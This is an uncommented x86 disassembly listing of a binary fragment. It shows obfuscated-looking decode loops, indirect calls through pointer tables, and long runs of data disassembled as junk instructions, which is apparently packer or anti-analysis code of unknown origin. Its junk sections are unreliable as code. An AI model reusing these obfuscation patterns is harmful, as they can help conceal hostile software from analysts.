  403966:	mov    ds:0x43432d,eax
  40396b:	jmp    0x403938
  403970:	mov    eax,ds:0x432cca
  403975:	add    DWORD PTR ds:0x432ce2,eax
  40397b:	mov    eax,0x8a3e
  403980:	xor    ax,WORD PTR [ecx+0x20]
  403984:	mov    ecx,0x3b04
  403989:	adc    DWORD PTR ds:0x4325f4,0x34fe
  403993:	add    ax,cx
  403996:	movzx  ecx,BYTE PTR ds:0x43431d
  40399d:	sub    DWORD PTR ds:0x4342a2,ecx
  4039a3:	movzx  eax,ax
  4039a6:	adc    ecx,DWORD PTR ds:0x434329
  4039ac:	mov    DWORD PTR [ebp-0xc],eax
  4039af:	and    ecx,0x4bd2
  4039b5:	mov    BYTE PTR [ebp-0x1],0x7f
  4039b9:	xor    ecx,ecx
  4039bb:	or     ecx,DWORD PTR ds:0x434296
  4039c1:	xor    ecx,DWORD PTR ds:0x43429a
  4039c7:	mov    DWORD PTR ds:0x434296,ecx
  4039cd:	lea    eax,[ebp-0x1]
  4039d0:	mov    DWORD PTR ds:0x432cbe,0x10
  4039da:	cmp    DWORD PTR ds:0x432cbe,0x0
  4039e1:	je     0x403a23
  4039e7:	cmp    DWORD PTR ds:0x432cbe,0x1d
  4039ee:	jne    0x403a11
  4039f4:	push   0x43428a
  4039f9:	push   0x43265d
  4039fe:	push   DWORD PTR [ebp-0xc]
  403a01:	push   0x5939
  403a06:	push   0x4c17
  403a0b:	call   DWORD PTR ds:0x432b2a
  403a11:	mov    ecx,DWORD PTR ds:0x432cbe
  403a17:	dec    ecx
  403a18:	mov    DWORD PTR ds:0x432cbe,ecx
  403a1e:	jmp    0x4039da
  403a23:	mov    DWORD PTR [ebp-0x10],eax
  403a26:	mov    al,BYTE PTR [ebp-0x1]
  403a29:	adc    DWORD PTR ds:0x4325f4,ecx
  403a2f:	mov    ecx,DWORD PTR [ebp-0x10]
  403a32:	xor    al,0x47
  403a34:	sub    al,0x37
  403a36:	and    DWORD PTR ds:0x43427e,0x4d53
  403a40:	mov    BYTE PTR [ecx],al
  403a42:	mov    DWORD PTR ds:0x432cde,0x1b
  403a4c:	cmp    DWORD PTR ds:0x432cde,0x0
  403a53:	je     0x403ab0
  403a59:	cmp    DWORD PTR ds:0x432cde,0xc
  403a60:	jne    0x403a7c
  403a66:	push   0x432ce6
  403a6b:	push   DWORD PTR [ebp-0x28]
  403a6e:	push   0x43429e
  403a73:	push   DWORD PTR [ebp-0x28]
  403a76:	call   DWORD PTR ds:0x432b2e
  403a7c:	cmp    DWORD PTR ds:0x432cde,0xd
  403a83:	jne    0x403a98
  403a89:	xor    ecx,ecx
  403a8b:	xor    ecx,DWORD PTR ds:0x432cde
  403a91:	dec    ecx
  403a92:	mov    DWORD PTR ds:0x432cde,ecx
  403a98:	mov    ecx,DWORD PTR ds:0x432cde
  403a9e:	dec    ecx
  403a9f:	mov    DWORD PTR ds:0x432cde,ecx
  403aa5:	jmp    0x403a4c
  403aaa:	and    ecx,0x3444
  403ab0:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403ab7:	mov    DWORD PTR [ebp-0x10],0xf89c8530
  403abe:	add    DWORD PTR ds:0x43429a,edi
  403ac4:	mov    eax,DWORD PTR [ebp-0x8]
  403ac7:	or     DWORD PTR ds:0x434296,ecx
  403acd:	mov    ecx,0x7510855
  403ad2:	jmp    0x403c17
  403ad7:	and    eax,0x555995f7
  403adc:	pop    ecx
  403add:	icebp  
  403ade:	jae    0x403a7c
  403ae0:	lods   eax,DWORD PTR ds:[esi]
  403ae1:	imul   ebp,DWORD PTR [ebx],0xffffffd5
  403ae4:	cmp    BYTE PTR [esi+0x1b],cl
  403ae7:	in     al,dx
  403ae8:	push   ds
  403ae9:	jo     0x403b5b
  403aeb:	sbb    BYTE PTR [edi+0x70],bh
  403aee:	jo     0x403a8f
  403af0:	addr16 retf 
  403af2:	push   eax
  403af3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403af4:	nop
  403af5:	test   eax,0x48f779c7
  403afa:	push   esp
  403afb:	ret    0x185f
  403afe:	cmc    
  403aff:	mov    ah,0x9f
  403b01:	mov    WORD PTR [esi],fs
  403b03:	and    BYTE PTR [edi-0x4f],bl
  403b06:	adc    ah,BYTE PTR ds:0x13037ef4
  403b0c:	xchg   BYTE PTR [edi-0x2daf2bfb],bh
  403b12:	inc    ebx
  403b13:	jo     0x403b00
  403b15:	loope  0x403b17
  403b17:	push   ds
  403b18:	mov    ch,0x3
  403b1a:	adc    cl,BYTE PTR [edx+0x6af1495c]
  403b20:	rcl    BYTE PTR [esp+edi*4-0x5a8b92bc],0x9d
  403b28:	call   0x2e2aa338
  403b2d:	sub    esp,ebx
  403b2f:	mov    es,WORD PTR [edi]
  403b31:	addr16 icebp 
  403b33:	mov    WORD PTR [esi],?
  403b35:	ds push 0xe2caf50f
  403b3b:	mov    ecx,0x25b03ae2
  403b40:	jnp    0x403bc0
  403b42:	das    
  403b43:	mov    eax,0x74974e67
  403b48:	xor    DWORD PTR [ecx+0x1b8eb20e],0x6869342c
  403b52:	clc    
  403b53:	ins    BYTE PTR es:[edi],dx
  403b54:	(bad)  
  403b57:	pop    edi
  403b58:	or     esi,DWORD PTR [eax-0x6c707bfb]
  403b5e:	pop    edi
  403b5f:	ss pop eax
  403b61:	dec    BYTE PTR [ecx+eax*8+0xa3abf34]
  403b68:	hlt    
  403b69:	pusha  
  403b6a:	inc    edx
  403b6b:	in     al,dx
  403b6c:	stos   DWORD PTR es:[edi],eax
  403b6d:	add    eax,0xd2cdc9a2
  403b72:	es retf 
  403b74:	sar    DWORD PTR [ecx],1
  403b76:	(bad)  
  403b77:	pop    edx
  403b78:	bound  eax,QWORD PTR [ebp+0xa9991c8]
  403b7e:	mov    ?,WORD PTR [ecx]
  403b80:	mov    eax,ds:0x10c22e63
  403b85:	sub    al,0xa4
  403b87:	jae    0x403b64
  403b89:	adc    DWORD PTR [edi],0xffffffe8
  403b8c:	inc    ecx
  403b8d:	adc    bh,BYTE PTR [eax+edi*4+0x330bd9bb]
  403b94:	or     al,BYTE PTR [edi-0x5d]
  403b97:	sahf   
  403b98:	pop    esi
  403b99:	hlt    
  403b9a:	sub    edi,DWORD PTR [edx+0x6142889b]
  403ba0:	mov    edi,0xd4aca348
  403ba5:	add    esp,DWORD PTR [ebx]
  403ba7:	pop    es
  403ba8:	in     eax,0x81
  403baa:	xor    eax,0xe72578fe
  403baf:	out    0xa7,al
  403bb1:	and    al,BYTE PTR [esi]
  403bb3:	jbe    0x403b73
  403bb5:	pop    eax
  403bb6:	add    esi,DWORD PTR [ebx+eax*2+0x70]
  403bba:	mov    bl,0xbf
  403bbc:	test   al,0xb6
  403bbe:	sub    esp,DWORD PTR [ecx]
  403bc0:	rol    edi,cl
  403bc2:	mov    ah,0x4c
  403bc4:	jns    0x403bf4
  403bc6:	loopne 0x403c0c
  403bc8:	push   eax
  403bc9:	hlt    
  403bca:	loope  0x403bae
  403bcc:	sti    
  403bcd:	fld    TBYTE PTR [edx]
  403bcf:	pusha  
  403bd0:	inc    eax
  403bd1:	push   ds
  403bd2:	jecxz  0x403c42
  403bd4:	in     al,dx
  403bd5:	jne    0x403bcf
  403bd7:	es retf 0x89c3
  403bdb:	mov    esp,0xec22c752
  403be0:	sub    eax,0x2a27ac26
  403be5:	sbb    bl,BYTE PTR [edx+0x30]
  403be8:	push   esp
  403be9:	jmp    0xd65e:0x2d882d1a
  403bf0:	jae    0x403bf9
  403bf2:	xor    ebp,ecx
  403bf4:	loop   0x403c3b
  403bf6:	pop    edx
  403bf7:	loop   0x403c38
  403bf9:	mov    edi,0x20f0b763
  403bfe:	fmul   QWORD PTR [edi]
  403c00:	aaa    
  403c01:	(bad)  
  403c02:	xor    ah,BYTE PTR es:[ebp-0x614dc392]
  403c09:	(bad)  
  403c0a:	mov    al,ds:0xc3c2f78c
  403c0f:	sub    ebx,DWORD PTR [edi]
  403c11:	xor    DWORD PTR [esi-0x62],0x36
  403c15:	fsubr  QWORD PTR [ecx-0x3eccb9aa]
  403c1b:	mov    esi,0x32729c
  403c20:	sbb    DWORD PTR ds:0x434276,0x434321
  403c2a:	add    eax,esi
  403c2c:	mov    DWORD PTR ds:0x432cd6,0x19db
  403c36:	jmp    0x403c4d
  403c3b:	mov    DWORD PTR ds:0x43426a,0x1bda
  403c45:	mov    dl,BYTE PTR [ebp-0x1]
  403c48:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403c4c:	inc    eax
  403c4d:	cmp    eax,0x40
  403c50:	jmp    0x403d95
  403c55:	sbb    bl,BYTE PTR [ebx+eiz*1+0x1981a102]
  403c5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c5d:	scas   al,BYTE PTR es:[edi]
  403c5e:	xchg   ecx,eax
  403c5f:	sub    al,0x28
  403c61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c62:	push   ebp
  403c63:	pop    eax
  403c64:	adc    DWORD PTR [ebp+ebx*1+0x7f187070],edx
  403c6b:	jo     0x403cdd
  403c6d:	xchg   BYTE PTR [edi+0x2e],ch
  403c70:	lock test BYTE PTR [eax+0x51],bl
  403c74:	adc    eax,ebp
  403c76:	jmp    0x602b5c0a
  403c7b:	pop    edx
  403c7c:	pop    DWORD PTR [esp+eiz*4-0x65]
  403c80:	cmp    al,0x33
  403c82:	mov    ds:0x8424866e,eax
  403c87:	xchg   ecx,eax
  403c88:	add    DWORD PTR [esi+0x27127b4f],esp
  403c8e:	daa    
  403c8f:	stos   BYTE PTR es:[edi],al
  403c90:	inc    eax
  403c91:	or     esp,DWORD PTR [ecx]
  403c93:	push   ecx
  403c94:	loopne 0x403cb6
  403c96:	sbb    BYTE PTR [edi+0x5aec1d31],0x1f
  403c9d:	fcom   QWORD PTR [ebx-0x68d29193]
  403ca3:	dec    edi
  403ca4:	jb     0x403c97
  403ca6:	repz test BYTE PTR ss:[edi-0x26],al
  403cab:	lods   al,BYTE PTR ds:[esi]
  403cac:	inc    eax
  403cad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cae:	dec    edi
  403caf:	es dec edx
  403cb1:	jle    0x403c9d
  403cb3:	das    
  403cb4:	push   esi
  403cb5:	int3   
  403cb6:	dec    edi
  403cb7:	mov    dh,0x90
  403cb9:	push   esp
  403cba:	add    ch,bl
  403cbc:	fiadd  DWORD PTR [ebx-0x79895a8c]
  403cc2:	out    dx,eax
  403cc3:	inc    edx
  403cc4:	pop    ebp
  403cc5:	mov    ah,0x1b
  403cc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cc8:	mov    cl,0x7c
  403cca:	and    edx,edx
  403ccc:	sub    eax,0x1a008d46
  403cd1:	pop    ss
  403cd2:	ds pop esp
  403cd4:	mov    bl,0x73
  403cd6:	inc    edx
  403cd7:	add    al,0x73
  403cd9:	jne    0x403caf
  403cdb:	dec    esi
  403cdc:	enter  0x144d,0x39
  403ce0:	pushf  
  403ce1:	and    al,ah
  403ce3:	jno    0x403cb2
  403ce5:	mov    gs,WORD PTR [eax]
  403ce7:	in     al,dx
  403ce8:	push   cs
  403ce9:	(bad)  
  403cea:	pusha  
  403ceb:	mov    bh,0xff
  403ced:	ret    0x62b2
  403cf0:	mov    esi,0x33ab791f
  403cf5:	iret   
  403cf6:	shl    DWORD PTR [ebp-0x3d],0x57
  403cfa:	jnp    0x403cb4
  403cfc:	pusha  
  403cfd:	stc    
  403cfe:	push   ebp
  403cff:	popf   
  403d00:	xor    eax,0x8ba60346
  403d05:	neg    BYTE PTR [edx+eax*4+0x1c9d51cd]
  403d0c:	xchg   esp,eax
  403d0d:	push   esi
  403d0e:	mov    esi,0xe90ab0e2
  403d13:	jp     0x403cf0
  403d15:	mov    esp,DWORD PTR [ebx+0x8f475e5]
  403d1b:	jns    0x403d36
  403d1d:	cdq    
  403d1e:	fucomp st(5)
  403d20:	aad    0x97
  403d22:	inc    esp
  403d23:	push   0xfffffff1
  403d25:	mov    ds:0xf8ce0fd8,eax
  403d2a:	xchg   ecx,eax
  403d2b:	or     BYTE PTR [ecx+0x42],dh
  403d2e:	jmp    0xbc9d:0x603b9b6c
  403d35:	jmp    0x403cfa
  403d37:	cmp    BYTE PTR [ebp+0x31],bh
  403d3a:	test   eax,0xfeea8770
  403d3f:	sahf   
  403d40:	sub    DWORD PTR [eax+0x3b609eea],esp
  403d46:	xchg   edi,eax
  403d47:	leave  
  403d48:	repz jge 0x403d76
  403d4b:	iret   
  403d4c:	dec    edx
  403d4d:	retf   
  403d4e:	pop    ss
  403d4f:	mov    ds:0x62e78417,eax
  403d54:	out    0x2b,al
  403d56:	dec    ecx
  403d57:	retf   
  403d58:	fnstsw WORD PTR [eax+0x67542d7a]
  403d5e:	jnp    0x403d55
  403d60:	jb     0x403d07
  403d62:	jecxz  0x403dad
  403d64:	dec    edi
  403d65:	jbe    0x403d6d
  403d67:	and    al,0xd9
  403d69:	xchg   edx,eax
  403d6a:	fadd   QWORD PTR [ebp+0x67]
  403d6d:	adc    al,0x2d
  403d6f:	mov    bl,0x93
  403d71:	dec    eax
  403d72:	test   eax,esp
  403d74:	xor    cl,bl
  403d76:	pop    eax
  403d77:	and    ebp,eax
  403d79:	push   0x67
  403d7b:	lahf   
  403d7c:	xor    DWORD PTR [ebx+ebx*1],0x4377e8e0
  403d83:	mov    al,ds:0xfbd7af87
  403d88:	xchg   edi,eax
  403d89:	repz push ecx
  403d8b:	ficomp DWORD PTR [esi]
  403d8d:	mov    edx,eax
  403d8f:	sar    BYTE PTR fs:[esi],cl
  403d92:	and    DWORD PTR [ebx-0x32],ebp
  403d95:	jb     0x403c3b
  403d9b:	mov    edx,DWORD PTR [ebp-0x8]
  403d9e:	and    DWORD PTR ds:0x43429a,0x0
  403da8:	jmp    0x403dbb
  403dad:	xor    eax,eax
  403daf:	add    eax,DWORD PTR ds:0x43429a
  403db5:	inc    eax
  403db6:	mov    ds:0x43429a,eax
  403dbb:	cmp    DWORD PTR ds:0x43429a,0x13
  403dc2:	jae    0x403dfe
  403dc8:	cmp    DWORD PTR ds:0x43429a,0xc
  403dcf:	jne    0x403dde
  403dd5:	push   DWORD PTR [ebp-0x1c]
  403dd8:	call   DWORD PTR ds:0x4328be
  403dde:	cmp    DWORD PTR ds:0x43429a,0xb
  403de5:	jne    0x403df9
  403deb:	xor    eax,eax
  403ded:	add    eax,DWORD PTR ds:0x43429a
  403df3:	inc    eax
  403df4:	mov    ds:0x43429a,eax
  403df9:	jmp    0x403dad
  403dfe:	mov    eax,DWORD PTR [ebp-0xc]
  403e01:	xor    edx,ecx
  403e03:	add    edx,esi
  403e05:	cmp    edx,eax
  403e07:	jmp    0x403f4c
  403e0c:	inc    ecx
  403e0d:	sub    al,0xb8
  403e0f:	xor    BYTE PTR [ebp+0x72],0x41
  403e13:	jmp    0x403d9a
  403e15:	inc    ebp
  403e16:	mov    al,0x72
  403e18:	cmp    ch,BYTE PTR [ebp+0x1cbcf8fc]
  403e1e:	jo     0x403e90
  403e20:	sbb    BYTE PTR [edi+0x70],bh
  403e23:	jo     0x403e63
  403e25:	lods   al,BYTE PTR ds:[esi]
  403e26:	pop    edi
  403e27:	ins    BYTE PTR es:[edi],dx
  403e28:	xchg   ecx,eax
  403e29:	sti    
  403e2a:	jmp    edi
  403e2c:	ds inc ebp
  403e2e:	out    0xde,al
  403e30:	jmp    0x403e30
  403e32:	mov    ?,WORD PTR [eax-0x5b92e43c]
  403e38:	and    DWORD PTR [eax+0x7a3ace34],esi
  403e3e:	popf   
  403e3f:	int3   
  403e40:	ds xchg esp,eax
  403e42:	push   ds
  403e43:	ret    0x7969
  403e46:	adc    eax,0xd0fb0737
  403e4b:	fsincos 
  403e4d:	fmul   QWORD PTR [ebp-0x7b]
  403e50:	fist   DWORD PTR [edi+0x5b6e5d35]
  403e56:	(bad)  
  403e57:	int    0x13
  403e59:	(bad)  
  403e5a:	call   0xfbeeadb0
  403e5f:	mov    ds:0xf05b13ab,eax
  403e64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e65:	sub    DWORD PTR [eax-0x17],esi
  403e68:	add    al,0xe3
  403e6a:	div    edi
  403e6c:	sub    BYTE PTR [edx+0x14],0x8c
  403e70:	stc    
  403e71:	mov    esp,0x4ded5d1
  403e76:	pop    ds
  403e77:	outs   dx,DWORD PTR ds:[esi]
  403e78:	test   eax,0xc4864f8b
  403e7d:	ror    DWORD PTR [eax-0x71],cl
  403e80:	retf   0xc88
  403e83:	inc    edi
  403e84:	mov    ebx,0xdd8cc495
  403e89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e8a:	ins    BYTE PTR es:[edi],dx
  403e8b:	fistp  QWORD PTR [eax]
  403e8d:	mov    al,0x8
  403e8f:	dec    esi
  403e90:	leave  
  403e91:	push   0xf841d5cf
  403e96:	fistp  DWORD PTR [ebx-0x3a]
  403e99:	aas    
  403e9a:	dec    ebx
  403e9b:	pop    edi
  403e9c:	cmp    BYTE PTR [edi+0x66f5313],dh
  403ea2:	stos   BYTE PTR es:[edi],al
  403ea3:	mov    ecx,DWORD PTR [ebp-0x2373b1b3]
  403ea9:	(bad)  
  403eaa:	jmp    0x8b17eaf4
  403eaf:	adc    BYTE PTR [edi+eax*8+0x50f077db],dl
  403eb6:	push   es
  403eb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403eb8:	mov    ch,0xaa
  403eba:	hlt    
  403ebb:	mov    bl,0x7c
  403ebd:	push   esi
  403ebe:	addr16 popf 
  403ec0:	push   es
  403ec1:	sbb    DWORD PTR [ecx],0x5a280bb2
  403ec7:	cs mov dh,0xd5
  403eca:	inc    esi
  403ecb:	sbb    BYTE PTR [eax+0x2d],cl
  403ece:	ss data16 sbb al,0x37
  403ed2:	loopne 0x403eac
  403ed4:	mov    al,ds:0x4a5667ad
  403ed9:	into   
  403eda:	adc    edi,edx
  403edc:	add    bh,dh
  403ede:	push   es
  403edf:	iret   
  403ee0:	add    ebp,DWORD PTR [ebx]
  403ee2:	leave  
  403ee3:	cmp    bh,al
  403ee5:	iret   
  403ee6:	fild   WORD PTR [eax]
  403ee8:	call   0x4313:0xbe8069fb
  403eef:	(bad)
  403ef3:	ret    
  403ef4:	jo     0x403f15
  403ef6:	mov    edx,0xb7f6d60d
  403efb:	(bad)  
  403efc:	enter  0x942b,0x3b
  403f00:	retf   0x934d
  403f03:	call   FWORD PTR [edi-0x27]
  403f06:	push   eax
  403f07:	push   ds
  403f08:	mov    esi,0x7d152e95
  403f0d:	jbe    0x403f37
  403f0f:	pop    ebp
  403f10:	and    ebx,edi
  403f12:	and    ecx,eax
  403f14:	stc    
  403f15:	add    eax,DWORD PTR [edx]
  403f17:	pop    esp
  403f18:	add    DWORD PTR [eax+0x20],0xa3b300e3
  403f1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f20:	gs std 
  403f22:	adc    DWORD PTR [edx-0x78],ebp
  403f25:	cli    
  403f26:	xor    BYTE PTR [ebx],bl
  403f28:	sbb    eax,0xbfa8a6fc
  403f2d:	adc    cl,BYTE PTR [ebp+0x24a54ab8]
  403f33:	sbb    eax,0x4af2d1d4
  403f38:	mov    eax,0x5f7dea47
  403f3d:	adc    DWORD PTR [esp+ebx*2-0x7c54e0f8],ebp
  403f44:	dec    esp
  403f45:	ret    
  403f46:	mov    cr3,edx
  403f49:	popf   
  403f4a:	xor    eax,0x85840fe2
  403f4f:	add    DWORD PTR [eax],eax
  403f51:	add    BYTE PTR [ebx+0x57],dl
  403f54:	mov    edi,DWORD PTR [ebp+0x8]
  403f57:	mov    eax,0x8a3e
  403f5c:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403f61:	mov    edi,0x3b04
  403f66:	add    ax,di
  403f69:	movzx  eax,ax
  403f6c:	mov    DWORD PTR [ebp-0x14],eax
  403f6f:	mov    eax,DWORD PTR [ebp+0x8]
  403f72:	movzx  eax,WORD PTR [eax+edx*4]
  403f76:	xor    eax,0x8a3e
  403f7b:	add    eax,edi
  403f7d:	mov    edi,DWORD PTR [ebp-0x14]
  403f80:	mov    BYTE PTR [ebp+edi*1-0x58],al
  403f84:	mov    eax,DWORD PTR [ebp-0xc]
  403f87:	inc    edx
  403f88:	cmp    edx,eax
  403f8a:	jne    0x403f54
  403f90:	pop    edi
  403f91:	jmp    0x4040d6
  403f96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f97:	fisubr DWORD PTR [edi-0x598e8c4b]
  403f9d:	jmp    0x4923f392
  403fa2:	dec    ecx
  403fa3:	ins    BYTE PTR es:[edi],dx
  403fa4:	or     eax,0x701b64a2
  403fa9:	jo     0x403fc3
  403fab:	jg     0x40401d
  403fad:	jo     0x403f86
  403faf:	outs   dx,BYTE PTR ds:[esi]
  403fb0:	in     eax,0xe3
  403fb2:	sub    ah,BYTE PTR fs:[ebx]
  403fb5:	shr    DWORD PTR [ecx-0x11378463],1
  403fbb:	cmp    cl,dl
  403fbd:	mov    bh,0x65
  403fbf:	out    dx,eax
  403fc0:	enter  0xaebf,0x56
  403fc4:	aad    0x8
  403fc6:	cli    
  403fc7:	pop    ds
  403fc8:	cs shr DWORD PTR ds:[ebx],1
  403fcc:	ror    dl,0xae
  403fcf:	sub    eax,eax
  403fd1:	test   DWORD PTR [ebx+0x42],edi
  403fd4:	rcl    DWORD PTR [esp+ebx*1-0x1ec12fb7],0x64
  403fdc:	push   edx
  403fdd:	jb     0x403fd5
  403fdf:	fistp  DWORD PTR [esp+edx*4-0x1b9d7a8f]
  403fe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fe7:	test   ecx,edx
  403fe9:	ds loopne 0x403f7e
  403fec:	cmp    dl,BYTE PTR [edi]
  403fee:	out    dx,eax
  403fef:	or     eax,0x1e1f404d
  403ff4:	shl    dl,1
  403ff6:	pop    ds
  403ff7:	push   cs
  403ff8:	(bad)  
  403ff9:	push   ds
  403ffa:	xor    dl,BYTE PTR [ecx-0x55902d18]
  404000:	sbb    esi,DWORD PTR [esi]
  404002:	rcr    BYTE PTR [ebx+eiz*2-0x10ce1f00],cl
  404009:	fimul  DWORD PTR [edx]
  40400b:	lock dec edx
  40400d:	add    edx,DWORD PTR [ebp+0xb96c81c]
  404013:	ret    
  404014:	pop    edi
  404015:	rol    BYTE PTR [ebx+edx*8],cl
  404018:	into   
  404019:	mov    WORD PTR [edx],?
  40401b:	lea    ebp,[edx+ebp*8-0x76a02c65]
  404022:	jp     0x403fb8
  404024:	shr    esi,0x55
  404027:	(bad)  
  404028:	hlt    
  404029:	retf   
  40402a:	cli    
  40402b:	out    dx,al
  40402c:	mov    edi,0x50e425dc
  404031:	dec    ecx
  404032:	inc    esp
  404033:	add    dh,cl
  404035:	sti    
  404036:	mov    BYTE PTR [esi+0x3b3f50a6],dl
  40403c:	xchg   ecx,eax
  40403d:	addr16 std 
  40403f:	xor    bl,dh
  404041:	outs   dx,BYTE PTR ds:[esi]
  404042:	lahf   
  404043:	jecxz  0x404091
  404045:	jg     0x4040bf
  404047:	lahf   
  404048:	in     eax,dx
  404049:	mov    ds,ebp
  40404b:	dec    ecx
  40404c:	inc    edx
  40404d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40404e:	inc    esp
  40404f:	mov    dl,0x69
  404051:	and    BYTE PTR [ecx-0x5],al
  404054:	jns    0x404043
  404056:	push   es
  404057:	enter  0x57c9,0x7b
  40405b:	xchg   ecx,eax
  40405c:	push   ecx
  40405d:	inc    eax
  40405e:	jmp    0x69b4:0xe07a0b49
  404065:	mov    edi,0x7d61ae9e
  40406a:	mov    DWORD PTR [ebp+eax*4+0x7],ebx
  40406e:	pop    edi
  40406f:	js     0x404053
  404071:	inc    edi
  404072:	cmp    eax,0x87477f80
  404077:	adc    DWORD PTR [edx-0x1e937c04],edx
  40407d:	sub    al,0xc
  40407f:	or     al,BYTE PTR [esi-0x238dc309]
  404085:	cmp    dh,BYTE PTR [edi+0x16da2a21]
  40408b:	les    eax,FWORD PTR ds:0x3042f997
  404091:	push   esp
  404092:	inc    edx
  404093:	retf   0x241d
  404096:	jl     0x40404f
  404098:	adc    eax,0x47030c35
  40409d:	retf   0x5806
  4040a0:	ror    BYTE PTR [edi],1
  4040a2:	int3   
  4040a3:	rcl    BYTE PTR ds:[ebx-0x7b3e37db],1
  4040aa:	push   edx
  4040ab:	jge    0x4040ec
  4040ad:	pop    eax
  4040ae:	mov    eax,0x56b6a0de
  4040b3:	dec    ecx
  4040b4:	sub    dh,BYTE PTR [edx-0x50fdcab1]
  4040ba:	mov    esi,0x5400f5cc
  4040bf:	push   ebp
  4040c0:	pop    edi
  4040c1:	scas   eax,DWORD PTR es:[edi]
  4040c2:	push   ebx
  4040c3:	out    dx,al
  4040c4:	xchg   esp,eax
  4040c5:	mov    dl,0xd8
  4040c7:	sbb    eax,0xb8fee4db
  4040cc:	push   ds
  4040cd:	jne    0x40407c
  4040cf:	adc    bh,0xf7
  4040d2:	dec    esi
  4040d3:	fld    DWORD PTR [esi-0x5d]
  4040d6:	pop    ebx
  4040d7:	mov    eax,DWORD PTR [ebp-0x8]
  4040da:	mov    edx,DWORD PTR [ebp+0x10]
  4040dd:	jmp    0x404222
  4040e2:	aaa    
  4040e3:	ins    DWORD PTR es:[edi],dx
  4040e4:	pop    ss
  4040e5:	int3   
  4040e6:	push   ebp
  4040e7:	jb     0x4040dc
  4040e9:	jno    0x404096
  4040eb:	pop    ebx
  4040ec:	imul   edi,DWORD PTR [edx-0x1da5bf2d],0xc
  4040f3:	sbb    DWORD PTR [eax+0x70],esi
  4040f6:	sbb    BYTE PTR [edi+0x70],bh
  4040f9:	jo     0x4040e3
  4040fb:	(bad)  
  4040fc:	frstor [ecx-0x28]
  4040ff:	push   ebx
  404100:	lsl    esp,WORD PTR [ebx+ecx*8-0xbb1f5e4]
  404108:	sahf   
  404109:	sti    
  40410a:	rcl    DWORD PTR [ecx+0x10],0xbf
  40410e:	adc    eax,0x3a9694d9
  404113:	jmp    0x4040af
  404115:	sbb    al,0x8
  404117:	or     BYTE PTR [edx-0x45757499],0x1
  40411e:	fmulp  st(1),st
  404120:	mov    ebp,0x59ce1966
  404125:	xchg   ecx,eax
  404126:	mov    WORD PTR [esi+0x72],es
  404129:	cwde   
  40412a:	repnz adc ecx,DWORD PTR [eax-0x35]
  40412e:	mov    esi,0x4562a438
  404133:	mov    BYTE PTR [edx+0x2bfc8a59],cl
  404139:	test   al,ch
  40413b:	push   0xffffffcd
  40413d:	mov    WORD PTR [ebp+ebp*8+0x15c13807],cs
  404144:	push   ebx
  404145:	imul   edi,DWORD PTR [ebp-0x184b4085],0xffffffe4
  40414c:	xor    DWORD PTR [esi+edi*4],edi
  40414f:	stc    
  404150:	mov    ecx,0xadb02191
  404155:	sub    al,0xed
  404157:	outs   dx,BYTE PTR ss:[esi]
  404159:	mov    WORD PTR [eax],cs
  40415b:	es movs BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40415e:	mov    ebx,0x56b64d91
  404163:	jae    0x404169
  404165:	mov    dl,0x74
  404167:	cmp    ah,BYTE PTR [edx+0xf]
  40416a:	and    edi,DWORD PTR ds:0xf4235653
  404170:	lock mov edx,DWORD PTR [esi-0x2380d82b]
  404177:	stc    
  404178:	sbb    edx,DWORD PTR [esi+0x1e]
  40417b:	int3   
  40417c:	mov    edx,0x622950a3
  404181:	scas   al,BYTE PTR es:[edi]
  404182:	retf   0x40bd
  404185:	pop    ebp
  404186:	inc    edi
  404187:	mov    ch,0xa
  404189:	call   0x4a087a42
  40418e:	jnp    0x404111
  404190:	jecxz  0x404173
  404192:	cmp    DWORD PTR [edx+0x32],edi
  404195:	add    al,BYTE PTR [edi-0x3a]
  404198:	nop
  404199:	sub    ch,BYTE PTR ss:[edx-0x22fd3240]
  4041a0:	or     cl,BYTE PTR [ecx+0x12]
  4041a3:	pop    ds
  4041a4:	loopne 0x4041a4
  4041a6:	adc    BYTE PTR ds:0x480c04e2,0x7a
  4041ad:	ret    
  4041ae:	(bad)  
  4041af:	(bad)  
  4041b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041b1:	cmp    BYTE PTR [ecx+0x6f],0x47
  4041b5:	ret    
  4041b6:	test   bh,0x6
  4041b9:	idiv   DWORD PTR [ebx+ebp*1-0x258b6ac0]
  4041c0:	inc    edx
  4041c1:	mov    ss,WORD PTR [eax-0x197cdc93]
  4041c7:	xor    al,0x90
  4041c9:	jns    0x404176
  4041cb:	inc    esi
  4041cc:	sbb    ch,BYTE PTR [ebx]
  4041ce:	nop
  4041cf:	lea    esp,[edi]
  4041d1:	stc    
  4041d2:	or     eax,0x71796833
  4041d7:	push   ebx
  4041d8:	clc    
  4041d9:	sbb    edi,DWORD PTR [ecx]
  4041db:	gs out 0x81,al
  4041de:	sar    edi,1
  4041e0:	pop    ebx
  4041e1:	push   0x96e0df93
  4041e6:	in     al,0x96
  4041e8:	xchg   BYTE PTR [edx+ebp*2-0x22855895],cl
  4041ef:	mov    dl,0x53
  4041f1:	xchg   edi,eax
  4041f2:	pop    esi
  4041f3:	sub    DWORD PTR [eax+0x349616e9],ebp
  4041f9:	loopne 0x404270
  4041fb:	jns    0x4041ad
  4041fd:	pushf  
  4041fe:	fistp  DWORD PTR [edi-0x2d]
  404201:	sub    eax,0xdd933598
  404206:	sub    al,0xf6
  404208:	dec    eax
  404209:	xchg   edi,eax
  40420a:	sbb    DWORD PTR [esi+ebp*8-0x218ed11c],eax
  404211:	es dec ebp
  404213:	fwait
  404214:	into   
  404215:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404216:	outs   dx,DWORD PTR ds:[esi]
